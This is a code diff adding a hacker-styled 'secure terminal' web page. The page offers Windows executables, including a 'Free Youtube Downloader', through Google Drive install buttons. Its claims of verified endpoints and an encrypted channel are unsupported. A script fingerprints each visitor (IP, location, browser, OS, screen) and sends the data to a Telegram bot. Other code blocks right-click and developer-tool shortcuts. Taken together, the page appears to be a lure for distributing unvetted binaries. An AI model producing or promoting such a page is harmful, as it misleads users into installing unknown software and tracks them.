@@ -63,3 +63,287 @@
     font-weight: normal;
   }
 
+  .prompt-line {
+    color: #2ecc60;
+    margin: 4px 0;
+  }
+  .prompt-line::before {
+    content: "> ";
+    color: #1f7a3f;
+  }
+
+  .divider {
+    border: none;
+    border-top: 1px dashed #1f7a3f;
+    margin: 25px 0;
+  }
+
+  .notice {
+    color: #7fdba0;
+    font-size: 0.92em;
+    border-left: 2px solid #1f7a3f;
+    padding-left: 12px;
+    margin: 18px 0;
+  }
+
+  .apps-section h2 {
+    font-size: 1.05em;
+    color: #4dff88;
+    letter-spacing: 1px;
+    font-weight: normal;
+    margin-bottom: 18px;
+  }
+
+  .app-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border: 1px solid #1a4d2e;
+    background-color: #08120a;
+    padding: 14px 18px;
+    margin-bottom: 12px;
+  }
+
+  .app-info {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .app-name {
+    color: #cfead9;
+    font-size: 0.95em;
+  }
+
+  .app-meta {
+    color: #4a8a63;
+    font-size: 0.78em;
+    margin-top: 3px;
+  }
+
+  .app-button button {
+    background-color: #0f1f0f;
+    border: 1px solid #2ecc60;
+    color: #4dff88;
+    font-family: "Courier New", monospace;
+    font-size: 0.85em;
+    padding: 8px 16px;
+    cursor: pointer;
+    letter-spacing: 1px;
+  }
+
+  .app-button button:hover {
+    background-color: #1a3a20;
+    color: #ffffff;
+  }
+
+  .app-button button:active {
+    background-color: #2ecc60;
+    color: #06120a;
+  }
+
+  .status-bar {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.78em;
+    color: #4a8a63;
+    border-top: 1px solid #1f7a3f;
+    padding: 10px 14px;
+  }
+
+  .status-dot {
+    display: inline-block;
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background-color: #2ecc60;
+    margin-right: 6px;
+  }
+
+  a {
+    color: #4dff88;
+  }
+
+  footer {
+    text-align: center;
+    font-size: 0.75em;
+    color: #3a6b4a;
+    padding: 14px;
+    border-top: 1px solid #1f7a3f;
+  }
+</style>
+</head>
+<body>
+
+<div class="scanlines"></div>
+
+<div class="container">
+
+  <div class="titlebar">
+    <span>SECURE_TERMINAL </span>
+    <span>SESSION: ACTIVE</span>
+  </div>
+
+  <div class="body-inner">
+
+    <h1>APPLICATION ACCESS TERMINAL</h1>
+
+    <p class="prompt-line">connection established.</p>
+    <p class="prompt-line">authentication: not required for public downloads.</p>
+    <p class="prompt-line">select an application below to proceed.</p>
+
+    <div class="notice">
+      NOTICE: All downloads are served from verified endpoints. Review each
+      application before installation.
+    </div>
+
+    <div class="notice">
+      NOTICE: This page logs basic visit data (IP, approximate location,
+      browser/device info) for security and analytics purposes.
+    </div>
+
+    <hr class="divider">
+
+    <div class="apps-section">
+      <h2>// AVAILABLE APPLICATIONS</h2>
+
+      <div class="app-row">
+        <div class="app-info">
+          <span class="app-name"> Free Youtube Downloader </span>
+          <span class="app-meta">build: exe /  size: 160.2 MB </span>
+        </div>
+        <div class="app-button">
+          <button onclick="window.location.href='https://drive.google.com/file/d/14c0Res5AeqMGK2JD4jBK42RPxb23O_DG/view?usp=sharing'">
+            INSTALL
+          </button>
+        </div>
+      </div>
+
+      <div class="app-row">
+        <div class="app-info">
+          <span class="app-name">AI Terminal</span>
+          <span class="app-meta">build: exe · size: 14.3 MB</span>
+        </div>
+        <div class="app-button">
+          <button onclick="window.location.href='https://drive.google.com/file/d/1EAvWug8fdBtijA5pyM3T_gMUxvUbQ3Fk/view?usp=drive_link'">
+            INSTALL
+          </button>
+        </div>
+      </div>
+
+      <div class="app-row">
+        <div class="app-info">
+          <span class="app-name">APP_THREE</span>
+          <span class="app-meta">build: stable · size: --</span>
+        </div>
+        <div class="app-button">
+          <button onclick="window.location.href=''">
+            INSTALL
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <p class="prompt-line">end of listing.</p>
+
+  </div>
+
+  <div class="status-bar">
+    <span><span class="status-dot"></span>SYSTEM NOMINAL</span>
+    <span>ENCRYPTED CHANNEL</span>
+  </div>
+
+  <footer>
+    SECURE_TERM // internal distribution page // static build
+  </footer>
+
+</div>
+
+<script>
+  // --- Telegram visitor notification (via Netlify Function proxy) ---
+  // The bot token stays hidden inside the Netlify Function's environment variables.
+  const TELEGRAM_CHAT_ID = "8484620043";
+
+  async function notifyVisit() {
+    let ip = "unknown";
+    let location = "unknown";
+    try {
+      const geoRes = await fetch("https://ipapi.co/json/");
+      const geoData = await geoRes.json();
+      ip = geoData.ip || "unknown";
+      const city = geoData.city || "";
+      const country = geoData.country_name || "";
+      location = [city, country].filter(Boolean).join(", ") || "unknown";
+    } catch (e) {
+      // ignore if lookup fails, still send the rest of the notification
+    }
+
+    // Basic browser/device info (from the browser itself, no extra request needed)
+    const ua = navigator.userAgent;
+    let browser = "Unknown";
+    if (ua.includes("Edg/")) browser = "Edge";
+    else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
+    else if (ua.includes("Firefox/")) browser = "Firefox";
+    else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
+
+    let os = "Unknown";
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Mac OS")) os = "macOS";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+    else if (ua.includes("Linux")) os = "Linux";
+
+    const screenSize = window.screen.width + "x" + window.screen.height;
+    const language = navigator.language || "unknown";
+
+    const message =
+      "New visitor on SECURE_TERM\n" +
+      "Time: " + new Date().toLocaleString() + "\n" +
+      "IP: " + ip + "\n" +
+      "Location: " + location + "\n" +
+      "Browser: " + browser + "\n" +
+      "OS: " + os + "\n" +
+      "Screen: " + screenSize + "\n" +
+      "Language: " + language + "\n" +
+      "Referrer: " + (document.referrer || "direct");
+
+    fetch("/.netlify/functions/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    }).catch(() => {
+      // fail silently, don't break the page if the request doesn't go through
+    });
+  }
+
+  notifyVisit();
+
+  // --- Basic deterrents against casual inspection ---
+  // Note: these do NOT provide real security. Anyone determined can still
+  // view the page source or open dev tools through other means.
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+  });
+
+  document.addEventListener('keydown', function (e) {
+    // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+    if (
+      e.key === 'F12' ||
+      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) ||
+      (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) ||
+      (e.ctrlKey && (e.key === 'U' || e.key === 'u'))
+    ) {
+      e.preventDefault();
+    }
+  });
+
+  console.log('%cStop!', 'color:red; font-size:30px; font-weight:bold;');
+  console.log('This is a browser feature intended for developers. Pasting or running code here you don\'t understand could compromise your account or device.');
+</script>
+
+</body>
+</html>
